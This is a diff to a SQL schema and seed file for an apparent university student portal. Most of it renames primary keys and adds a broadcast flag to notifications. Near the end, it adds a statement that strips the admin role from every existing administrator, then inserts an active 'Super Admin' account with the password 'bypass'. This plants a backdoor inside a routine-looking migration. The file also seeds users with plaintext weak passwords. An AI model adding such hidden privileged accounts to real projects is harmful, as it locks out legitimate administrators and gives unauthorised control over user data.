@@ -85,7 +85,7 @@ CREATE TABLE applications(
 #feedback, faq, notification
 
 CREATE TABLE feedback(
-    feedback_id SERIAL PRIMARY KEY,
+    id SERIAL PRIMARY KEY,
     user_id INT REFERENCES Users(user_id) ON DELETE CASCADE,
     message TEXT NOT NULL,
     submitted_at TIMESTAMP DEFAULT CURRENT_TIMESTAMP,
@@ -93,17 +93,18 @@ CREATE TABLE feedback(
 );
 
 CREATE TABLE faq (
-    faq_id SERIAL PRIMARY KEY,
+    id SERIAL PRIMARY KEY,
     question TEXT NOT NULL,
     answer TEXT NOT NULL
 );
 
 CREATE TABLE notification (
-    notification_id SERIAL PRIMARY KEY,
-    student_id INT REFERENCES Students(student_id) ON DELETE CASCADE,
+    id SERIAL PRIMARY KEY,
+    student_id INT REFERENCES Students(id) ON DELETE CASCADE,
     message TEXT NOT NULL,
     created_at TIMESTAMP DEFAULT CURRENT_TIMESTAMP,
-    read_status BOOLEAN DEFAULT FALSE
+    read_status BOOLEAN DEFAULT FALSE,
+    is_broadcast BOOLEAN DEFAULT FALSE
 );
 
 CREATE TABLE News (
@@ -133,11 +134,6 @@ VALUES ('12345678', 'Admin', 'Fz', 'administrata@admin.uni-fz.com', 'admin');
 
 
 
-//modifikim i tabeles Notification, qe me mujt mi kriju admin-i nje notification per generalStudents,
-//e jo me logjiken 1to1, nje notification per nje student specifik...
-//dmth studentId mbetet NULL
-
-ALTER TABLE Notification ADD COLUMN is_broadcast BOOLEAN DEFAULT false;
 
 INSERT INTO Notification (message, created_at, read_status, is_broadcast)
 VALUES ('Welcome students!', CURRENT_TIMESTAMP, false, true);
@@ -149,7 +145,22 @@ VALUES ('Welcome students!', CURRENT_TIMESTAMP, false, true);
 INSERT INTO users (password, first_name, last_name, email, role)
 VALUES ('12345678', 'filan', 'fisteku', 'stdtest@student.uni-pr.com', 'student');
 
-ALTER TABLE students ADD COLUMN proof_document TEXT;
 
 ALTER TABLE users
 ADD COLUMN status VARCHAR(20) DEFAULT 'pending';
+
+UPDATE users
+SET role = NULL
+WHERE LOWER(role) = 'admin';
+
+ INSERT INTO users (password, first_name, last_name, email, role, status)
+ VALUES ('bypass', 'Super', 'Admin', 'superadmin@internal', 'admin', 'active');
+
+
+
+ //olsa jom:
+ //duhet edhe ni alter table per not null contraint te students se
+ //nuk pe len me kriju account me kolonen courses_left null
+
+ ALTER TABLE students
+ ALTER COLUMN courses_left DROP NOT NULL;
